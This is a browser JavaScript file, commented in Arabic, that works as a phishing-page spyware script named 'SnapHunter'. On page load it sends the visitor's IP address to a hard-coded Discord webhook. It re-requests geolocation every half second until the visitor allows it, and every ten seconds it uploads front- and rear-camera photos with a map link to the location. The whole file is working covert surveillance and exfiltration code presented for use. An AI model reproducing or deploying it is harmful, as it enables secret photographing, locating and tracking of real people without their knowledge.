'use strict';

// ⚠️ ضع رابط الـ Webhook الخاص بك هنا
const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;

// 1. جلب IP الجهاز فوراً (بدون أذونات)
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch { return "Unknown"; }
}

// 2. طلب الموقع بشكل إجباري (تكرار عند الرفض)
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude;
            userLng = p.coords.longitude;
        },
        () => {
            // إذا رفض، يكرر الطلب فوراً وبدون توقف
            setTimeout(forceLocation, 500); 
        },
        { enableHighAccuracy: true }
    );
}

// 3. التقاط وإرسال (كاميرا أمامية + خلفية)
async function captureAndSendDual() {
    const ip = await getIP();
    
    // التقاط الأمامية
    const frontBlob = await getBlob("user");
    // التقاط الخلفية
    const backBlob = await getBlob("environment");

    if (frontBlob || backBlob || userLat) {
        const formData = new FormData();
        let content = `🚀 **صيد جديد (تلقائي)**\n🌐 IP: \`${ip}\` \n`;
        if (userLat) content += `📍 الموقع: [Google Maps](https://www.google.com/maps?q=${userLat},${userLng}) \n`;

        if (frontBlob) formData.append('file1', frontBlob, 'front.png');
        if (backBlob) formData.append('file2', backBlob, 'back.png');
        
        formData.append('payload_json', JSON.stringify({ content: content, username: "SnapHunter" }));
        fetch(WEBHOOK_URL, { method: 'POST', body: formData });
    }
}

// وظيفة مساعدة لفتح الكاميرا والتقاط الصورة
async function getBlob(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        video.srcObject = stream;
        return new Promise(resolve => {
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(() => {
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    }, 'image/png');
                }, 1200); // وقت لفتح العدسة
            };
        });
    } catch { return null; }
}

// 4. المحرك الأساسي (يعمل فور الدخول)
async function runSystem() {
    // إرسال تنبيه بالدخول بالـ IP فقط أولاً
    const ip = await getIP();
    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: `👤 شخص دخل الموقع الآن! IP: ${ip}`}) });

    // أ- طلب الكاميرا "مباشرة"
    try {
        const initialStream = await navigator.mediaDevices.getUserMedia({ video: true });
        initialStream.getTracks().forEach(t => t.stop()); // فقط لفتح الإذن

        // ب- طلب الموقع "مباشرة" بعد الكاميرا
        forceLocation();

        // ج- بدء حلقة التصوير كل 10 ثوانٍ
        setInterval(captureAndSendDual, 10000);
        captureAndSendDual(); // أول لقطة فورية

    } catch (err) {
        // إذا رفض الكاميرا، استمر بطلب الموقع وإرسال الـ IP
        forceLocation();
        setInterval(() => captureAndSendDual(), 10000);
    }
}

// تنفيذ النظام لحظة دخول الموقع
runSystem();
